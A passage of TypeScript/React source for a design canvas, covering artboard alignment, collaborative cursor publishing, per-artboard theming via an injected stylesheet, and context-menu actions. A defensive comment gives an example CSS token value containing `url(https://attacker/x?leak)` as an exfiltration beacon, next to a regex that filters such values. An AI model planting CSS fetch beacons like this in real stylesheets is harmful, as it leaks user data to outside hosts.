  // descendant — buttons / links with their own cursor declaration get
  // overridden when in comment / hand modes.
  useEffect(() => {
    const host = hostRef.current;
    if (!host) return;
    host.setAttribute('data-active-tool', tool);
    return () => {
      host.removeAttribute('data-active-tool');
    };
  }, [hostRef, tool]);

  // T28 — modifier-aware cursor (Alt → copy on cd-id, Shift → crosshair on
  // body padding). CSS-driven once data-mod-* is reflected on the host.
  useCursorModifiers(hostRef);
  // T29 — arrow nudge (artboards) + Cmd+A select-all (active artboard).
  // Cmd+D duplicate deferred; no live duplicate channel for either artboards
  // or stamped elements yet.
  useKeyboardDiscipline();

  const artboardsCtx = useArtboardsContext();
  const dragBus = useDragStateContext();

  // T33 — programmatic-zoom easing via double-click on empty world only.
  // Per post-Wave-3 user feedback, dblclick-on-artboard auto-zoom was
  // surprising (interfered with native dblclick text-select inside chrome
  // and felt magnetic). We keep the dblclick-empty → `fit()` path because
  // it's a discoverable "back to overview" gesture; artboard zoom is still
  // reachable via Cmd+1 and the zoom HUD.
  useEffect(() => {
    if (!controller) return;
    const host = hostRef.current;
    if (!host) return;
    const onDbl = (e: MouseEvent) => {
      const t = e.target as Element | null;
      if (!t?.closest) return;
      // Floating chrome / overlays / drawn user content / any artboard
      // surface → leave alone. Only dblclick that lands on the canvas
      // background outside every artboard triggers `fit()`.
      if (
        t.closest(
          '.dc-mm, .dc-zoom-tb, .dc-tool-palette, .dc-context-menu, .dc-annot-svg, .dc-annot-ctx, .cm-composer, .cm-thread, .cm-mention-popup, .cm-pin'
        )
      ) {
        return;
      }
      if (t.closest('[data-dc-screen]')) return; // any part of an artboard
      e.preventDefault();
      controller.fit();
    };
    host.addEventListener('dblclick', onDbl);
    return () => host.removeEventListener('dblclick', onDbl);
  }, [controller, hostRef]);

  // T31 — level-of-detail attribute on `.dc-canvas`. CSS rules hide
  // pre-attentive chrome (ticks, distance pills, accent ring) below 0.35
  // zoom and sharpen text above 4.0. tldraw's textShadowLod = 0.35 is the
  // canonical threshold. Reads the published viewport (settle-cadence) so
  // the LOD doesn't flicker between bands mid-zoom — chrome should settle
  // once per gesture, not on every frame.
  const publishedZoom = artboardsCtx?.viewport?.zoom ?? 1;
  useEffect(() => {
    const host = hostRef.current;
    if (!host) return;
    const lod = publishedZoom < 0.35 ? 'low' : publishedZoom > 4 ? 'crisp' : 'normal';
    host.setAttribute('data-cv-zoom-lod', lod);
    return () => host.removeAttribute('data-cv-zoom-lod');
  }, [hostRef, publishedZoom]);

  // Phase 8 — publish local cursor (world coords) + viewport to Awareness
  // so foreign peers can render our cursor on their CursorsOverlay. The
  // collab.publishAwareness call is already throttled to ~30 Hz internally
  // (use-collab.tsx) — we just need to compute screen → world per move.
  const collab = useCollab();
  useEffect(() => {
    const host = hostRef.current;
    if (!host || !collab || !controller) return;
    const onMove = (e: MouseEvent) => {
      const v = controller.viewport;
      // screen → world: world = (screen - viewport.{x,y}) / zoom.
      const worldX = (e.clientX - v.x) / Math.max(v.zoom, 0.0001);
      const worldY = (e.clientY - v.y) / Math.max(v.zoom, 0.0001);
      collab.publishAwareness({ cursor: { x: worldX, y: worldY } });
    };
    const onLeave = () => {
      collab.publishAwareness({ cursor: null });
    };
    host.addEventListener('mousemove', onMove);
    host.addEventListener('mouseleave', onLeave);
    return () => {
      host.removeEventListener('mousemove', onMove);
      host.removeEventListener('mouseleave', onLeave);
    };
  }, [hostRef, collab, controller]);

  // Phase 8 — publish viewport when it settles. The CursorsOverlay only
  // needs the LOCAL viewport (to transform foreign world coords back to
  // screen), but exposing ours over Awareness sets up Task 6's follow-mode.
  // biome-ignore lint/correctness/useExhaustiveDependencies: deliberate settle-cadence — re-publish only when x/y/zoom change, not on every viewport field.
  useEffect(() => {
    if (!collab || !controller) return;
    collab.publishAwareness({ viewport: controller.viewport });
  }, [
    collab,
    controller,
    controller?.viewport.x,
    controller?.viewport.y,
    controller?.viewport.zoom,
  ]);

  // Phase 8 — publish local selection so foreign PeerSelection halos can
  // render around what *I* selected. Convert the first entry's selector
  // (CSS path the peer resolves in their own DOM) + current bounds. The
  // bounds are screen-px from publish time — peers re-resolve cssPath
  // when possible and fall back to bounds otherwise.
  useEffect(() => {
    if (!collab) return;
    const first = selSet.selected[0];
    if (!first?.selector) {
      collab.publishAwareness({ selection: null });
      return;
    }
    const b = first.bounds;
    const bounds =
      b && typeof b === 'object'
        ? {
            x: Number(b.x) || 0,
            y: Number(b.y) || 0,
            w: Number(b.w) || 0,
            h: Number(b.h) || 0,
          }
        : { x: 0, y: 0, w: 0, h: 0 };
    collab.publishAwareness({ selection: { cssPath: first.selector, bounds } });
  }, [collab, selSet.selected]);

  // Phase 8 — publish annotation selection (Phase 5 strokes). Separate from
  // selSet because annotations have their own selection registry. Peers
  // render halos by querying `[data-id="<id>"]` so the same halo follows
  // resize / move (SVG re-emits with the same data-id). `Optional` flavor
  // because CanvasCore is mounted INSIDE the AnnotationSelectionProvider
  // tree but TypeScript / a defensive boot path can't always prove it.
  const annotSelForPublish = useAnnotationSelectionOptional();
  const annotSelectedIds = annotSelForPublish?.selectedIds;
  useEffect(() => {
    if (!collab) return;
    collab.publishAwareness({ annotationSelection: annotSelectedIds ?? [] });
  }, [collab, annotSelectedIds]);

  /**
   * T24 — distribute the currently-selected artboards evenly on the given
   * axis. Requires ≥ 3 selected artboards. Sort by leading edge, hold the
   * first + last in place, and reposition the middle artboards so the gaps
   * between trailing edge → next leading edge are equal.
   */
  const distributeArtboards = useCallback(
    (axis: 'x' | 'y') => {
      if (!artboardsCtx || !dragBus) return;
      const ids = new Set(
        selSet.selected.filter((s) => !!s.artboardId).map((s) => s.artboardId as string)
      );
      if (ids.size < 3) return;
      const targets: ArtboardRect[] = artboardsCtx.artboards.filter((r) => ids.has(r.id));
      if (targets.length < 3) return;
      const sorted = [...targets].sort((a, b) => (axis === 'x' ? a.x - b.x : a.y - b.y));
      const first = sorted[0];
      const last = sorted[sorted.length - 1];
      if (!first || !last) return;
      // Total content extent (sum of side-lengths on the axis) + the span
      // between first leading edge and last trailing edge gives us the gap
      // budget to divide equally between (n-1) inter-artboard slots.
      const sideLen = (r: ArtboardRect) => (axis === 'x' ? r.w : r.h);
      const totalSides = sorted.reduce((acc, r) => acc + sideLen(r), 0);
      const span =
        (axis === 'x' ? last.x + last.w - first.x : last.y + last.h - first.y) - totalSides;
      const gap = span / (sorted.length - 1);
      const moved: { id: string; x: number; y: number }[] = [];
      let cursor = axis === 'x' ? first.x + first.w + gap : first.y + first.h + gap;
      for (let i = 1; i < sorted.length - 1; i++) {
        const r = sorted[i];
        if (!r) continue;
        if (axis === 'x') {
          moved.push({ id: r.id, x: Math.round(cursor), y: r.y });
          cursor += r.w + gap;
        } else {
          moved.push({ id: r.id, x: r.x, y: Math.round(cursor) });
          cursor += r.h + gap;
        }
      }
      if (moved.length === 0) return;
      dragBus.commitPositions(moved, { label: equalSpacingLabel(sorted.length) });
    },
    [artboardsCtx, dragBus, selSet.selected]
  );

  /**
   * G7 — align selected artboards to a common edge / midline. Requires ≥ 2
   * selected artboards. Six modes:
   *   - 'left'      → all artboards share the minimum x of the set
   *   - 'right'     → all artboards share the maximum (x + w) edge
   *   - 'center-x'  → all artboards share the midpoint of the set's x extent
   *   - 'top'       → all artboards share the minimum y
   *   - 'bottom'    → all artboards share the maximum (y + h) edge
   *   - 'center-y'  → all artboards share the midpoint of the set's y extent
   *
   * Holds the reference edge constant; only the perpendicular axis stays as
   * each artboard already was (alignment doesn't relocate on the orthogonal
   * axis). This matches Figma / Sketch / FigJam align semantics.
   */
  const alignArtboards = useCallback(
    (mode: AlignMode) => {
      if (!artboardsCtx || !dragBus) return;
      const ids = new Set(
        selSet.selected.filter((s) => !!s.artboardId).map((s) => s.artboardId as string)
      );
      if (ids.size < 2) return;
      const targets: ArtboardRect[] = artboardsCtx.artboards.filter((r) => ids.has(r.id));
      if (targets.length < 2) return;

      // Union bbox for center modes.
      let xMin = Number.POSITIVE_INFINITY;
      let yMin = Number.POSITIVE_INFINITY;
      let xMax = Number.NEGATIVE_INFINITY;
      let yMax = Number.NEGATIVE_INFINITY;
      for (const r of targets) {
        if (r.x < xMin) xMin = r.x;
        if (r.y < yMin) yMin = r.y;
        if (r.x + r.w > xMax) xMax = r.x + r.w;
        if (r.y + r.h > yMax) yMax = r.y + r.h;
      }
      const cx = (xMin + xMax) / 2;
      const cy = (yMin + yMax) / 2;

      const moved: { id: string; x: number; y: number }[] = [];
      for (const r of targets) {
        let nx = r.x;
        let ny = r.y;
        switch (mode) {
          case 'left':
            nx = xMin;
            break;
          case 'right':
            nx = xMax - r.w;
            break;
          case 'center-x':
            nx = cx - r.w / 2;
            break;
          case 'top':
            ny = yMin;
            break;
          case 'bottom':
            ny = yMax - r.h;
            break;
          case 'center-y':
            ny = cy - r.h / 2;
            break;
        }
        if (Math.round(nx) === r.x && Math.round(ny) === r.y) continue;
        moved.push({ id: r.id, x: Math.round(nx), y: Math.round(ny) });
      }
      if (moved.length === 0) return;
      dragBus.commitPositions(moved, { label: alignLabel(mode, targets.length) });
    },
    [artboardsCtx, dragBus, selSet.selected]
  );

  /**
   * G2v2 — "Fit just this artboard" context-menu entry previously bridged
   * via a synthetic click on the label button (which used to call
   * controller.jumpTo). Now that the label is purely a11y, the menu entry
   * needs a direct path: look the rect up from the live artboards list and
   * call jumpTo straight on the controller.
   */
  const focusArtboard = useCallback(
    (artboardId: string) => {
      if (!controller || !artboardsCtx) return;
      const rect = artboardsCtx.artboards.find((r) => r.id === artboardId);
      if (rect) controller.jumpTo(rect);
    },
    [controller, artboardsCtx]
  );

  const registry = useMemo<ContextRegistry>(
    () =>
      buildRegistry({
        controller,
        clearSelection: selSet.clear,
        selSet,
        distributeArtboards,
        alignArtboards,
        focusArtboard,
      }),
    [controller, selSet, distributeArtboards, alignArtboards, focusArtboard]
  );

  // Distribute is reached via the MultiArtboardToolbar (floating chrome
  // anchored above the group bbox) + context menu. No keyboard shortcut —
  // user feedback (post-Wave-2) preferred the toolbar over global hotkeys.

  return (
    <ExportDialogProvider>
      <ContextMenuProvider registry={registry}>
        <CanvasRouter
          hostRef={hostRef}
          distributeArtboards={distributeArtboards}
          alignArtboards={alignArtboards}
        >
          {children}
        </CanvasRouter>
      </ContextMenuProvider>
    </ExportDialogProvider>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Artboard theme (D9 + theme-default-follow, 2026-05-31). The status-bar theme
// toggle (vpravo dole) is the SINGLE SOURCE OF TRUTH: the canvas-shell chrome
// AND every artboard follow it by default via `data-maude-theme`. The right-
// click `Theme ▸ DS default / Light / Dark / Follow chrome` submenu PINS one
// artboard to override that default — re-themed by stamping its content wrapper
// with the DS's theme-wrapper convention. (Before this date the default was the
// inverse — artboards kept their own DS theme and following was opt-in — which
// produced the recurring "canvas dark / chrome light" mismatch.)
//
// DS theme-wrapper conventions vary (`.maude[data-theme]`, `.mdcc[data-theme]`,
// `.app[data-theme]`, bare `[data-theme]`, …) and there's no reliable config
// flag, so we DETECT it with a hidden computed-style probe: stamp a throwaway
// nested <div> with each candidate `<class>[data-theme=light|dark]` and keep the
// first whose resolved `--bg-0` differs between light and dark. Because the probe
// tests a NON-root element, "supported" is exactly "stamping one artboard will
// work" — a DS that only themes `:root[data-theme]` correctly reports unsupported
// (you genuinely can't theme a single artboard there).
//
// Candidate classes are DERIVED FROM THE LIVE DOM (2026-07-02): the DS's own
// rootClass wrapper is already in the artboard content carrying `[data-theme]`
// (e.g. `<div class="maude" data-theme="dark">`), so we read those class strings
// straight off the page instead of guessing. A hardcoded guess list (`['', 'mdcc',
// 'app']`) missed EVERY DS whose rootClass wasn't in it — including this repo's own
// `.maude` — which greyed out Light/Dark on a DS that fully ships both themes. The
// historical guesses stay as a trailing fallback for a canvas whose wrapper hasn't
// mounted yet at probe time.

interface DsThemeSupport {
  supported: boolean;
  /** The class the DS scopes its theme blocks to (`''` = bare `[data-theme]`). */
  wrapperClass: string;
}

let _dsThemeSupport: DsThemeSupport | null = null;

function detectDsThemeSupport(): DsThemeSupport {
  if (_dsThemeSupport) return _dsThemeSupport;
  const fallback: DsThemeSupport = { supported: false, wrapperClass: '' };
  if (typeof document === 'undefined' || !document.body) return fallback;
  try {
    const host = document.createElement('div');
    host.setAttribute('aria-hidden', 'true');
    host.style.cssText =
      'position:absolute;left:-9999px;top:0;width:0;height:0;overflow:hidden;pointer-events:none;';
    document.body.appendChild(host);
    const read = (cls: string, theme: string): string => {
      const el = document.createElement('div');
      if (cls) el.className = cls;
      el.setAttribute('data-theme', theme);
      host.appendChild(el);
      const v = getComputedStyle(el).getPropertyValue('--bg-0').trim();
      host.removeChild(el);
      return v;
    };
    // Derive candidate wrapper classes from the DS wrappers already in the DOM
    // (elements carrying `data-theme` are the DS rootClass wrappers), trying both
    // the full className ("maude di-root") and each individual token ("maude",
    // "di-root"). Bare `''` first (cleanest), historical guesses last as a
    // pre-mount fallback. A Set de-dupes; insertion order keeps DOM-derived first.
    const candidates = new Set<string>(['']);
    for (const el of Array.from(document.querySelectorAll('[data-theme]'))) {
      const cn = (el as HTMLElement).className;
      if (typeof cn === 'string' && cn.trim()) {
        candidates.add(cn.trim());
        for (const tok of cn.trim().split(/\s+/)) candidates.add(tok);
      }
    }
    candidates.add('mdcc');
    candidates.add('app');
    let found = fallback;
    for (const cls of candidates) {
      const light = read(cls, 'light');
      const dark = read(cls, 'dark');
      if (light && dark && light !== dark) {
        found = { supported: true, wrapperClass: cls };
        break;
      }
    }
    document.body.removeChild(host);
    // Cache only a POSITIVE detection. With follow-chrome now the artboard
    // default, this can run on first paint — before the DS stylesheet has
    // parsed — where the probe reads empty tokens and wrongly reports
    // unsupported. Caching that would permanently disable theming; instead
    // re-probe until support is confirmed (or the DS genuinely has one theme).
    if (found.supported) _dsThemeSupport = found;
    return found;
  } catch {
    return fallback;
  }
}

// Why not just stamp `data-theme` on the `.dc-artboard` element? Two reasons,
// both found the hard way: (1) React OWNS the artboard <article> + the canvas
// content's `rootClass` wrapper — it reconciles their className/attrs back to
// the JSX values on every re-render, wiping any imperative mutation; and (2)
// the canvas content carries its OWN `rootClass[data-theme]` wrapper (the DS
// default), which re-establishes the default tokens BELOW the artboard, so
// setting `data-theme` on the outer article never reaches the content. The
// robust mechanism is a single injected <style> keyed by the STABLE
// `data-dc-screen` attribute (which React always re-renders WITH), re-declaring
// the chosen theme's `--*` tokens scoped to the artboard's content wrapper.
// Survives re-renders, beats the wrapper on cascade order, zero flicker.

// Reject token VALUES that could turn the re-emitted <style> into a resource
// fetch / exfil beacon. Per the CSS spec a custom-property value can't contain
// an unmatched top-level `}` (so brace-breakout to other selectors is already
// impossible), but `url()` / `image()` / `@import` / comments survive verbatim.
// For a TRUSTED same-origin DS this is inert, but a DDR-054 untrusted synced
// canvas could ship `--bg-0: #fff url(https://attacker/x?leak)` — copying it
// here would fire that fetch when the artboard renders. Drop such values; the
// token simply falls back to the DS default for that artboard. (Security
// review F2, 2026-05-29 — defense-in-depth on top of the canvas-origin CSP.)
const _UNSAFE_TOKEN_VALUE = /url\(|image\(|image-set\(|-image-set\(|@import|\/\*|expression\(/i;

// Collect a DS theme block's custom-property declarations by scanning the
// loaded stylesheets for top-level rules whose selector targets that theme.
// Only `--*` props are copied (token re-definitions) — never layout/type, and
// never @media-nested rules (e.g. the prefers-reduced-motion 1ms collapse).
const _themeDecls: Partial<Record<'light' | 'dark', string>> = {};
function collectThemeDeclarations(theme: 'light' | 'dark'): string {
  const cached = _themeDecls[theme];
  if (cached != null) return cached;
  let decls = '';
  if (typeof document !== 'undefined') {
    for (const sheet of Array.from(document.styleSheets)) {
      let rules: CSSRuleList | undefined;
      try {
        rules = sheet.cssRules;
      } catch {
        continue; // cross-origin / unreadable sheet
      }
      if (!rules) continue;
      for (const rule of Array.from(rules)) {
        if (!(rule instanceof CSSStyleRule)) continue;
        if (!(rule.selectorText || '').includes(`[data-theme="${theme}"]`)) continue;
        const style = rule.style;
        for (let i = 0; i < style.length; i++) {
          const prop = style[i];
          if (!prop.startsWith('--')) continue;
          const value = style.getPropertyValue(prop);
          if (_UNSAFE_TOKEN_VALUE.test(value)) continue;
          decls += `${prop}:${value};`;
        }
      }
    }
  }
  // Cache only a NON-EMPTY result — same first-paint race as detectDsThemeSupport:
  // a scan that runs before the DS stylesheet parses finds nothing, and caching
  // '' would freeze the artboard un-themed forever. Leave it uncached so the
  // post-load rebuild (window 'load' / the theme MutationObserver) repopulates it.
  if (decls) _themeDecls[theme] = decls;
  return decls;
}

// Every artboard FOLLOWS the chrome theme by default (the status-bar toggle is
// the source of truth). A per-artboard pin OVERRIDES that: 'ds' = the design
// system's native theme (opt out of following entirely), 'light' / 'dark' = a
// fixed theme. Absence from this map = follow chrome.
type ArtboardPin = 'ds' | 'light' | 'dark';
const _artboardPins = new Map<string, ArtboardPin>();

function cssEsc(v: string): string {
  return typeof CSS !== 'undefined' && CSS.escape ? CSS.escape(v) : v;
}

// Selector targeting the artboard's content wrapper (where the DS theme block
// is re-established). Beats `.<wrapper>[data-theme="…"]` because the injected
// <style> is appended after the DS stylesheet (later-wins on equal specificity).
function artboardScopeSelector(screenId: string): string {
  const { wrapperClass } = detectDsThemeSupport();
  const base = `[data-dc-screen="${cssEsc(screenId)}"]`;
  if (wrapperClass) {
    const c = cssEsc(wrapperClass);
    return `${base} .${c},${base}.${c}`;
  }
  return `${base} [data-theme],${base}[data-theme]`;
}

// Like artboardScopeSelector but matches EVERY artboard except the pinned ones —
// backs the default-follow rule, which themes all un-pinned artboards in one
// declaration. Pinned ids are :not()-excluded so the per-screen pin rule never
// has to out-specify this global one (they target disjoint elements).
function globalArtboardScopeSelector(excludeIds: string[]): string {
  const { wrapperClass } = detectDsThemeSupport();
  const not = excludeIds.map((id) => `:not([data-dc-screen="${cssEsc(id)}"])`).join('');
  const base = `[data-dc-screen]${not}`;
  if (wrapperClass) {
    const c = cssEsc(wrapperClass);
    return `${base} .${c},${base}.${c}`;
  }
  return `${base} [data-theme],${base}[data-theme]`;
}

function rebuildArtboardThemeStyle(): void {
  if (typeof document === 'undefined') return;
  let el = document.getElementById('dc-artboard-theme-css') as HTMLStyleElement | null;
  if (!el) {
    el = document.createElement('style');
    el.id = 'dc-artboard-theme-css';
    document.head.appendChild(el);
  }
  let css = '';
  // (1) Default — every un-pinned artboard follows the chrome theme. Pinned
  // artboards are :not()-excluded so this rule never competes with their
  // per-screen rule below. When the DS doesn't define the chrome theme's tokens
  // (collectThemeDeclarations → ''), nothing is emitted and the artboard keeps
  // its native DS theme — there's no alternate palette to follow to.
  const pinnedIds = [..._artboardPins.keys()];
  const followDecls = collectThemeDeclarations(currentChromeTheme());
  if (followDecls) css += `${globalArtboardScopeSelector(pinnedIds)}{${followDecls}}\n`;
  // (2) Explicit per-artboard pins. 'ds' emits nothing (the :not() above already
  // released that artboard back to its native DS theme); 'light' / 'dark'
  // re-declare the chosen theme's tokens scoped to that one artboard.
  for (const [screenId, pin] of _artboardPins) {
    if (pin === 'ds') continue;
    const decls = collectThemeDeclarations(pin);
    if (decls) css += `${artboardScopeSelector(screenId)}{${decls}}\n`;
  }
  el.textContent = css;
}

/** Current canvas-shell chrome theme (mirrors `data-maude-theme` on <html>). */
function currentChromeTheme(): 'light' | 'dark' {
  if (typeof document === 'undefined') return 'dark';
  return document.documentElement.dataset.maudeTheme === 'light' ? 'light' : 'dark';
}

/**
 * Pin a single artboard's theme (keyed by its stable `data-dc-screen` id), or
 * clear the pin so it returns to the default — following the chrome theme.
 *   'follow' → remove the pin (default: track the chrome theme toggle)
 *   'ds'     → pin to the design system's native theme (stop following)
 *   'light' / 'dark' → pin to a fixed theme
 */
function setArtboardTheme(screenId: string, mode: 'follow' | ArtboardPin): void {
  if (mode === 'follow') _artboardPins.delete(screenId);
  else _artboardPins.set(screenId, mode);
  rebuildArtboardThemeStyle();
}

/**
 * Re-theme every following artboard when the chrome theme flips. The
 * default-follow rule in rebuildArtboardThemeStyle reads currentChromeTheme()
 * live, so a plain rebuild re-points every un-pinned artboard at the new theme
 * in one shot. Kept under the original name so the MutationObserver call site
 * and the initial 'load' trigger stay untouched.
 */
function applyArtboardFollowers(): void {
  rebuildArtboardThemeStyle();
}

// ─────────────────────────────────────────────────────────────────────────────
// Registry builder — closes over controller + clear callback.

function buildRegistry(deps: {
  controller: ViewportControllerHandle | null;
  clearSelection: () => void;
  selSet: { selected: Selection[]; replace: (s: Selection | Selection[]) => void };
  distributeArtboards: (axis: 'x' | 'y') => void;
  alignArtboards: (mode: 'left' | 'right' | 'center-x' | 'top' | 'bottom' | 'center-y') => void;
  focusArtboard: (artboardId: string) => void;
}): ContextRegistry {
  const { controller, clearSelection, selSet, distributeArtboards, alignArtboards, focusArtboard } =
    deps;

  // T24 — distribute commands are only enabled when ≥ 3 artboards are
  // selected. Below that, the menu items render as `disabled` so the user
  // sees the affordance but understands the precondition.
  // G7 — align commands are enabled at ≥ 2 (alignment is well-defined with 2).
  const selectedArtboardCount = selSet.selected.filter((s) => !!s.artboardId).length;
  const distributeEnabled = selectedArtboardCount >= 3;
  const alignEnabled = selectedArtboardCount >= 2;

  const copy = (text: string): void => {
    if (typeof navigator === 'undefined' || !navigator.clipboard) return;
    void navigator.clipboard.writeText(text).catch(() => {
      /* clipboard blocked */
    });
  };

  // issue-90 — right-click "Add comment" (element / artboard-chrome / world)
  // used to only postMessage the parent shell, which merely mirrors the
  // target for the StatusBar/sidebar; it never dispatched `cm:open-composer`,
  // the event `comments-overlay.tsx` actually listens on to open the
  // composer. Selecting the menu item did nothing. `openCommentComposer`
  // sends both, matching the working comment-tool-click path
  // (canvas-comment-mount.tsx's `dropComment`).
  const postComposeForTarget = (target: ContextTarget): void => {
    if (typeof window === 'undefined') return;
    const sel = buildComposeSelection(target, target.clientX, target.clientY);
    openCommentComposer(sel, target.clientX, target.clientY);
  };

  const fitItem: MenuItem = {
    id: 'fit-view',
    label: 'Fit to view',
    shortcut: '1',
    onSelect: () => controller?.fit(),
  };
  const resetItem: MenuItem = {
    id: 'reset-view',
    label: 'Reset view',
    shortcut: '⌘0',
    onSelect: () => controller?.reset(),
  };

  // Phase 6.5 — context-menu → ExportDialog. Each entry dispatches a custom
  // event the dialog provider listens for; this avoids prop-drilling the
  // dialog handle through every menu callback. The scope arg prefills the
  // dialog's scope dropdown so the user lands on the right resolution.
  const exportItem = (id: string, label: string, scope: string, shortcut?: string): MenuItem => ({
    id,
    label,
    shortcut,
    onSelect: () => {
      try {
        window.dispatchEvent(new CustomEvent('maude:open-export', { detail: { scope } }));
      } catch {
        /* non-window environments */
      }
    },
  });

  // Per-artboard theme PIN, keyed by the stable `data-dc-screen` id
  // (target.artboardId) via an injected stylesheet (see setArtboardTheme).
  // Following the chrome theme is the default; this submenu overrides it for one
  // artboard. The DS-supports-both probe gates Light / Dark / "Follow chrome"
  // (all no-ops on a single-theme DS); only "DS default" is always meaningful.
  const themeSupport = detectDsThemeSupport();
  const themeHint = 'This design system defines only one theme';
  const themeItem: MenuItem = {
    id: 'theme',
    label: 'Theme',
    onSelect: () => {
      /* parent of a submenu — never invoked directly */
    },
    submenu: [
      {
        id: 'theme-ds-default',
        label: 'DS default',
        onSelect: (target) => {
          if (target.artboardId) setArtboardTheme(target.artboardId, 'ds');
        },
      },
      {
        id: 'theme-light',
        label: 'Light',
        disabled: !themeSupport.supported,
        disabledHint: themeHint,
        onSelect: (target) => {
          if (target.artboardId) setArtboardTheme(target.artboardId, 'light');
        },
      },
      {
        id: 'theme-dark',
        label: 'Dark',
        disabled: !themeSupport.supported,
        disabledHint: themeHint,
        onSelect: (target) => {
          if (target.artboardId) setArtboardTheme(target.artboardId, 'dark');
        },
      },
      {
        id: 'theme-follow',
        label: 'Follow chrome (default)',
        disabled: !themeSupport.supported,
        disabledHint: themeHint,
        onSelect: (target) => {
          if (target.artboardId) setArtboardTheme(target.artboardId, 'follow');
        },
      },
    ],
  };

  // feature-1-artboard-kinds-foundation, T8 — kind-switch submenu, same
  // shape as themeItem above (a parent-only MenuItem whose onSelect never
  // fires). The write is main-origin-only (DDR-054): post to the parent
  // shell (dgn:'set-artboard-kind-request'), which calls
  // api.setArtboardKindOp and records undo — mirrors delete-artboard-request.
  const postArtboardKindRequest = (artboardId: string, kind: string | null): void => {
    try {
      window.parent.postMessage({ dgn: 'set-artboard-kind-request', artboardId, kind }, '*');
    } catch {
      /* detached / cross-origin */
    }
  };
  const kindItem: MenuItem = {
    id: 'kind',
    label: 'Artboard kind',
    onSelect: () => {
      /* parent of a submenu — never invoked directly */
    },
    submenu: [
      {
        id: 'kind-digital',
        label: 'Digital (default)',
        // feature-4 (user steer 2026-07-19) — digital/print artboards are the
        // marketing-graphics kinds: on switching, offer to freeze the whole
        // layout to absolute so every element is freely draggable. Convert
        // FIRST (freeze at the current visual), then switch the kind.
        onSelect: (target) => {
          if (!target.artboardId) return;
          const artboardId = target.artboardId;
          void (async () => {
            const freeze = await canvasConfirm(
              'Digital artboards work best with freely movable elements.\nAlso freeze the current layout (convert everything to position: absolute)? This is a one-way change — ⌘Z right after still reverts it.',
              {
                title: 'Switch to Digital',
                confirmLabel: 'Switch + freeze',
                cancelLabel: 'Just switch',
              }
            );
            if (freeze) await postConvertArtboardToAbsolute(artboardId, { skipConfirm: true });
            postArtboardKindRequest(artboardId, null);
          })();
        },
      },
      {
        id: 'kind-print',
        label: 'Print',
        onSelect: (target) => {
          if (!target.artboardId) return;
          const artboardId = target.artboardId;
          void (async () => {
            const freeze = await canvasConfirm(
              'Print artboards work best with freely movable, absolutely positioned elements.\nAlso freeze the current layout (convert everything to position: absolute)? This is a one-way change — ⌘Z right after still reverts it.',
              {
                title: 'Switch to Print',
                confirmLabel: 'Switch + freeze',
                cancelLabel: 'Just switch',
              }
            );
            if (freeze) await postConvertArtboardToAbsolute(artboardId, { skipConfirm: true });
            postArtboardKindRequest(artboardId, 'print');
          })();
        },
      },
      {
        id: 'kind-web',
        label: 'Web',
        onSelect: (target) => {
          if (target.artboardId) postArtboardKindRequest(target.artboardId, 'web');
        },
      },
      {
        id: 'kind-video',
        label: 'Video',
        onSelect: (target) => {
          if (target.artboardId) postArtboardKindRequest(target.artboardId, 'video');
        },
      },
    ],
  };

  // feature-3-web-artboards T3 — "Duplicate at width…" submenu, same
  // parent-only-MenuItem shape as themeItem/kindItem above. Breakpoint
  // widths are the same 4 values as the studio shell's own SCREEN_PRESETS
  // (mobile/tablet/laptop/desktop) — hardcoded here rather than imported
  // since this module bundles into the canvas iframe, a separate bundle
  // graph from the studio shell's app.jsx (same reasoning as kindItem
  // duplicating the ArtboardKind union above).
  const postDuplicateArtboardRequest = (artboardId: string, width: number): void => {
    try {
      window.parent.postMessage({ dgn: 'duplicate-artboard-request', artboardId, width }, '*');
    } catch {
      /* detached / cross-origin */
    }
  };
  const DUP_BREAKPOINTS: Array<{ id: string; label: string; width: number }> = [
    { id: 'dup-bp-mobile', label: 'Mobile — 390px', width: 390 },
    { id: 'dup-bp-tablet', label: 'Tablet — 834px', width: 834 },
    { id: 'dup-bp-laptop', label: 'Laptop — 1280px', width: 1280 },
    { id: 'dup-bp-desktop', label: 'Desktop — 1440px', width: 1440 },
  ];
  const duplicateAtBreakpointItem: MenuItem = {
    id: 'duplicate-at-breakpoint',
    label: 'Duplicate at width…',
    onSelect: () => {
      /* parent of a submenu — never invoked directly */
    },
    submenu: DUP_BREAKPOINTS.map(
      ({ id, label, width }): MenuItem => ({
        id,
        label,
        onSelect: (target) => {
          if (target.artboardId) postDuplicateArtboardRequest(target.artboardId, width);
        },
      })
    ),
  };

  // feature-4 T8 (convert-to-absolute, DDR-188) — the DIRECT stamped children of
  // a container that are eligible for the "Remove auto layout" convert: skips
  // dev-server chrome, requires a data-cd-id. Returns null when the element
  // isn't a convertible container (no stamped direct children).
  const convertibleChildrenOf = (el: Element | null): HTMLElement[] | null => {
    if (!el) return null;
    const kids = Array.from(el.children).filter(
      (c) => !c.closest('.dgn-pin, .dc-cv-halo, .dc-cv-group-bbox')
    ) as HTMLElement[];
    const stamped = kids.filter((c) => c.hasAttribute('data-cd-id'));
    return stamped.length > 0 ? stamped : null;
  };
  // Count how many elements in the artboard body carry `cdId` — >1 means a
  // repeated (`.map`) or shared-component instance, which convert-to-absolute
  // refuses (one source element can't hold N distinct absolute positions).
  const cdIdCountInArtboard = (el: Element, cdId: string): number => {
    const body = el.closest('.dc-artboard-body') ?? el.ownerDocument;
    try {
      return body.querySelectorAll(`[data-cd-id="${CSS.escape(cdId)}"]`).length;
    } catch {
      return 99;
    }
  };
  // feature-4 unified subtree convert (dogfood round 4, 2026-07-20) — ONE
  // walk + ONE confirm for the whole subtree, whether rooted at a right-
  // clicked container (element context menu) or the artboard body. The
  // earlier per-container element action made the user confirm once PER
  // nested container ("modal vyskočí 10×"); now a single action converts the
  // entire subtree in one batch (one undo seq), dissolving unstyled layout
  // wrappers along the way.
  const isUnstyledWrapper = (el: HTMLElement): boolean => {
    const cs = getComputedStyle(el);
    const bg = cs.backgroundColor;
    const transparentBg = bg === 'transparent' || bg === 'rgba(0, 0, 0, 0)';
    return (
      transparentBg &&
      cs.backgroundImage === 'none' &&
      (Number.parseFloat(cs.borderTopWidth) || 0) === 0 &&
      (Number.parseFloat(cs.borderRightWidth) || 0) === 0 &&
      (Number.parseFloat(cs.borderBottomWidth) || 0) === 0 &&
      (Number.parseFloat(cs.borderLeftWidth) || 0) === 0 &&
      cs.boxShadow === 'none' &&
      (cs.borderRadius === '0px' || cs.borderRadius === '0') &&
      cs.overflow !== 'hidden' &&
      cs.overflowX !== 'hidden' &&
      cs.overflowY !== 'hidden' &&
      cs.opacity === '1' &&
      cs.filter === 'none' &&
